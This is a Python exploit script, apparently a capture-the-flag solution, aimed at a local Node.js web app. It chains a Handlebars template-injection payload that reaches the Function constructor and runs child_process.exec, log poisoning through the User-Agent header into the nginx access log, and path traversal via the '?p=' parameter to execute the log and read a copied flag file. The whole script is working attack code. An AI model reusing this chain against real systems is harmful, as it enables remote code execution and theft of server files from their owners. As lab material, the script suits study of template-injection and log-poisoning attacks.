#!/usr/bin/python3

import requests
import socket

TARGET = "localhost"
HTTP_TARGET = f"http://{TARGET}:3000/"  # remove port if necessary

# Reset
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, 1337))
print(s.recv(1024))
s.close()

# Inject payload

s_data = """
import('child_process').then(cp=>cp.exec('cp /app/flag* /solve_62394'))
""".strip()
s_data = "String.fromCharCode(" + ",".join([str(ord(x)) for x in s_data]) + ")"

PAYLOAD = (
    """
{{#with 's' as |string|}}
  {{#with 'e'}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub 'constructor')}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push 'return eval("""
    + s_data
    + """);'}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
"""
)
PAYLOAD = "".join([s.strip() for s in PAYLOAD.strip().splitlines()])
print(PAYLOAD)

requests.get(
    HTTP_TARGET + "doesntexist",
    headers={"User-Agent": PAYLOAD},
)

# Execute payload
print(requests.get(HTTP_TARGET + "?p=../../../../../var/log/nginx/access.log").text)
print(requests.get(HTTP_TARGET + "?p=../../../../../solve_62394").text)
